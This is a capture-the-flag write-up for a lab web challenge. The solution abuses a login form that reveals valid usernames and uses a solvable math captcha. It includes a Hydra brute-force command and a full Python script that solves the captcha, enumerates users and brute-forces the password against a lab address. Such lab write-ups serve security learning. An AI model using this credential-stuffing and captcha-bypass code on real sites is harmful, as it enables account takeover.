---
title: "Capture! [WEB]"
description: "Simple login page to practice broken authentication vulnerability."
sidebar_position: 1
tags: ["web"]
---

*May 9, 2023*

Simple login page to practice broken authentication vulnerability.

## Challenge Description

> Can you bypass the login form?

**DOWNLOADED TASK FILES**: `usernames.txt`, `passwords.txt`

**usernames.txt**

```text
rachel
rodney
corrine
erik
chuck
[877 lines...] 
ronny
colin
ivy
madge
orville
```

**passwords.txt**

```text
football
kimberly
mookie
daniel
love21
[1557 lines...]
douglas
qwerty
gabby
thankyou
arturo
```

## Solution

We had been given a simple login site with username and password need to be filled. The first method comes in my mind with the `usernames.txt` and `passwords.txt` given is to brute-force the login page by using HYDRA.

```text
hydra -L usernames.txt -P passwords.txt 10.10.85.242 http-post-form "/login:username=^USER^&password=^PASS^:F=Error" -V -t 20 -I
```

However, it has 1375826 combinations to go through. Moreover, the website activates the captcha checker due to multiple login attempts. Therefore, I consider to look at other entry points within the website.

From my observation, the website does give us a vulnerable behavior which is the **Error message** it returns.

![image](/img/ctfs/tryhackme-capture-01.png)

Based on the image above, when a user enters a set of credentials, it will return an error message `"The user 'username' does not exist."`.

In other words, the website is checking the validity of the `username` instead of checking the `username` and `password`. Thus, the approach of this challenge is to enumerate out the existing username on the website, and then enumerate the password correspond to the username we had enumerated previously. By looking at the challenge hint, we know that we are on the right path.

![image](/img/ctfs/tryhackme-capture-02.png)

First, we need to bypass the captcha checker before enumerating the username as the error message indicates the validity of captcha even the username is invalid.

![image](/img/ctfs/tryhackme-capture-03.png)

To do this, we can create a `get_captcha()` function to manage the captcha part.

```python
#!/usr/bin/env python3
import requests
import re

url = 'http://10.10.85.242/login'

u = open('usernames.txt', 'r').readlines()
p = open('passwords.txt', 'r').readlines()

usernames = ''.join(u).split('\n')
passwords = ''.join(p).split('\n')

def get_captcha(data):

	res = requests.post(url, data=data)

	for item in re.findall('[0-9].*=', str(res.text), re.I+re.M):
		found = '{}'.format(item).split(" ")

	if found[1] == '+':
		return int(found[0]) + int(found[2])
	elif found[1] == '-':
		return int(found[0]) - int(found[2])
	elif found[1] == '*':
		return int(found[0]) * int(found[2])
```

We can observe that every math question generated from the website are `addition`, `subtraction`, and `multiplication` between two numbers. This can be concluded by clicking the “Login” button multiple times.

```python
def enumerate_username():

	testdata = {
		"username": "fakeuser",
		"password": "fakepass",
	}

	testres = requests.post(url, data=testdata)
	captcha = get_captcha(testdata)
	
	for username in usernames:
		data = {
			"username": username,
			"password": "fakepass",
			"captcha": captcha
		}

		res = requests.post(url, data=data)
		captcha = get_captcha(data) # refresh the captcha

		if re.findall('does not exist', str(res.text), re.I+re.M):
			print(f"[-] {username} does not exist.")
		else:
			print(f"[+] {username} found.") 
			break

enumerate_username()
```

As the captcha checker only appear in the `HTTP POST response`, therefore, a `fakeuser` and `fakepass` is created for retrieving the captcha question. After that, loop through all the usernames in the `usernames.txt` and refresh the captcha.

![image](/img/ctfs/tryhackme-capture-04.png)

Once the username is found, the process of password enumeration is similar with `enumerate_username()`. The only modification is to replace `fakeuser` to the username found `natalie`, and the error message to `"Invalid password"`.

```python
def enumerate_password():

	testdata = {
		"username": "natalie", # enumerated
		"password": "fakepass",
	}

	testres = requests.post(url, data=testdata)
	captcha = get_captcha(testdata)
	
	for password in passwords:
		data = {
			"username": "natalie",
			"password": password,
			"captcha": captcha
		}

		try:
			res = requests.post(url, data=data)
			captcha = get_captcha(data)

			if re.findall('Invalid password', str(res.text), re.I+re.M):
				print(f"[-] Not this password '{password}'.")

		except Exception as e:
			print(f"[+] Password '{password}' found.")
			break

enumerate_password()
```

> NOTE: Once the password is found, the website is no longer generate a new captcha question as it will redirect to another site (e.g., dashboard, etc.). The `get_captcha()` function will not detect any captcha question and results an UnboundLocalError. Therefore, it can be solved with the use of `try` and `except`.

Login with the credentials we had found to get the `Flag.txt`.

![image](/img/ctfs/tryhackme-capture-05.png)

***FLAG***: `7df2eabce3xxxxxxxxxxxxxxxxxxxxxxx`
